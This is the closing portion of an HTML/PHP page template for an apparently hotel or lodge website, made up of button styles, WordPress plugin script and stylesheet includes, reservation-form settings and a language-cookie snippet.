.maxbutton-1.maxbutton.maxbutton-web-check-in{position:relative;text-decoration:none;display:inline-block;vertical-align:middle;width:250px;height:45px;border:2px solid rgba(98, 247, 113, 0);border-radius:4px 4px 4px 4px;background-color:#009d97;box-shadow:0px 0px 2px 0px #333333}.maxbutton-1.maxbutton.maxbutton-web-check-in:hover{border-color:#009d97;background-color:rgba(255, 255, 255, 0);box-shadow:0px 0px 2px 0px #333333}.maxbutton-1.maxbutton.maxbutton-web-check-in .mb-text{color:#ffffff;font-size:17px;text-align:center;font-style:normal;font-weight:bold;line-height:1em;box-sizing:border-box;display:block;background-color:unset;padding:13px 0px 0px 0px}.maxbutton-1.maxbutton.maxbutton-web-check-in:hover .mb-text{color:#009d97}@media only screen and (min-width:0px) and (max-width:480px){.maxbutton-1.maxbutton.maxbutton-web-check-in{width:90%}.maxbutton-1.maxbutton.maxbutton-web-check-in .mb-text{font-size:13px}}
</style><!--/email_off--><!--/noptimize-->
<link href="https://fonts.googleapis.com/css?family=Roboto:400" rel="stylesheet" property="stylesheet" type="text/css" media="all">

		<script type="text/javascript">
		if(typeof revslider_showDoubleJqueryError === "undefined") {
			function revslider_showDoubleJqueryError(sliderID) {
				var err = "<div class='rs_error_message_box'>";
				err += "<div class='rs_error_message_oops'>Oops...</div>";
				err += "<div class='rs_error_message_content'>";
				err += "You have some jquery.js library include that comes after the Slider Revolution files js inclusion.<br>";
				err += "To fix this, you can:<br>&nbsp;&nbsp;&nbsp; 1. Set 'Module General Options' ->  'jQuery & OutPut Filters' -> 'Put JS to Body' to on";
				err += "<br>&nbsp;&nbsp;&nbsp; 2. Find the double jQuery.js inclusion and remove it";
				err += "</div>";
			err += "</div>";
				jQuery(sliderID).show().html(err);
			}
		}		</script>
<link rel='stylesheet' id='animate-css-css' href='/resources/plugins/js_composer/assets/lib/bower/animate-css/animate.mine23c.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='vc_google_fonts_cinzelregular700900-css' href='https://fonts.googleapis.com/css?family=Cinzel%3Aregular%2C700%2C900&amp;ver=6.2.2' type='text/css' media='all' />
<link rel='stylesheet' id='prettyphoto-css' href='/resources/plugins/js_composer/assets/lib/prettyphoto/css/prettyPhoto.mine23c.css?ver=5.7' type='text/css' media='all' />
<link rel='stylesheet' id='vc_pageable_owl-carousel-css-css' href='/resources/plugins/js_composer/assets/lib/owl-carousel2-dist/assets/owl.mine23c.css?ver=5.7' type='text/css' media='all' />
<script type='text/javascript' src='/resources/plugins/contact-form-7/includes/swv/js/indexf2b4.js?ver=5.7.7' id='swv-js'></script>
<script type='text/javascript' id='contact-form-7-js-extra'>
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/pachiralodge.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
/* ]]> */
</script>
<script type='text/javascript' src='/resources/plugins/contact-form-7/includes/js/indexf2b4.js?ver=5.7.7' id='contact-form-7-js'></script>
<script type='text/javascript' src='includes/js/jquery/ui/core.min3f14.js?ver=1.13.2' id='jquery-ui-core-js'></script>
<script type='text/javascript' src='includes/js/jquery/ui/datepicker.min3f14.js?ver=1.13.2' id='jquery-ui-datepicker-js'></script>
<script type='text/javascript' id='jquery-ui-datepicker-js-after'>
jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Close","currentText":"Today","monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Previous","dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"dateFormat":"MM d, yy","firstDay":1,"isRTL":false});});
</script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/contact-form3781.js?ver=6.2.2' id='awe-js-contact-form-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/isotope.pkgd.min3781.js?ver=6.2.2' id='js-isotope-js'></script>
<script type='text/javascript' id='reservation-form-js-extra'>
/* <![CDATA[ */
var ReservationForm = {"textErrorDate":"You must choose a date","textErrorTime":"You must choose a time","textErrorPerson":"You must choose number of persons"};
/* ]]> */
</script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/shortcodes/assets/js/reservation-form3781.js?ver=6.2.2' id='reservation-form-js'></script>
<script type='text/javascript' src='includes/js/comment-reply.min3781.js?ver=6.2.2' id='comment-reply-js'></script>
<script type='text/javascript' src='includes/js/jquery/ui/accordion.min3f14.js?ver=1.13.2' id='jquery-ui-accordion-js'></script>
<script type='text/javascript' src='includes/js/jquery/ui/tabs.min3f14.js?ver=1.13.2' id='jquery-ui-tabs-js'></script>
<script type='text/javascript' src='includes/js/imagesloaded.mineda1.js?ver=4.1.4' id='imagesloaded-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/bootstrap.min.js' id='bootstrap-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/bootstrap-select.js' id='bootstrap-select-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/owl.carousel82fc.js?ver=2015620' id='owl-carousel-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/jquery.countdown.min.js' id='countdown-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/jquery.countTo.js' id='countTo-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/jquery.parallax-1.1.3.js' id='parallax-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/jquery.appear.min.js' id='appear-js'></script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/lib/jquery.magnific-popup.min.js' id='magnific-popup-js'></script>
<script type='text/javascript' id='script-js-extra'>
/* <![CDATA[ */
var sonora_main = {"url":"https:\/\/pachiralodge.com\/wp-admin\/admin-ajax.php","textDays":"Days","textHours":"Hours","textMinutes":"Minutes","textSeconds":"Seconds"};
/* ]]> */
</script>
<script type='text/javascript' src='resources/themes/Theme-Packages/sonora/assets/js/scripts.js' id='script-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/js/dist/js_composer_front.mine23c.js?ver=5.7' id='wpb_composer_front_js-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/lib/waypoints/waypoints.mine23c.js?ver=5.7' id='waypoints-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/lib/prettyphoto/js/jquery.prettyPhoto.mine23c.js?ver=5.7' id='prettyphoto-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/lib/bower/masonry/dist/masonry.pkgd.mine23c.js?ver=5.7' id='vc_masonry-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/lib/owl-carousel2-dist/owl.carousel.mine23c.js?ver=5.7' id='vc_pageable_owl-carousel-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/lib/bower/imagesloaded/imagesloaded.pkgd.min3781.js?ver=6.2.2' id='vc_grid-js-imagesloaded-js'></script>
<script type='text/javascript' src='includes/js/underscore.mind584.js?ver=1.13.4' id='underscore-js'></script>
<script type='text/javascript' src='/resources/plugins/js_composer/assets/js/dist/vc_grid.mine23c.js?ver=5.7' id='vc_grid-js'></script>
<script src="galeria.js"></script>
<script type='text/javascript'>
(function() {
				var expirationDate = new Date();
				expirationDate.setTime( expirationDate.getTime() + 31536000 * 1000 );
				document.cookie = "pll_language=en; expires=" + expirationDate.toUTCString() + "; path=/; secure; SameSite=Lax";
			}());
</script>
</body>

</html>

<?php
}
?>
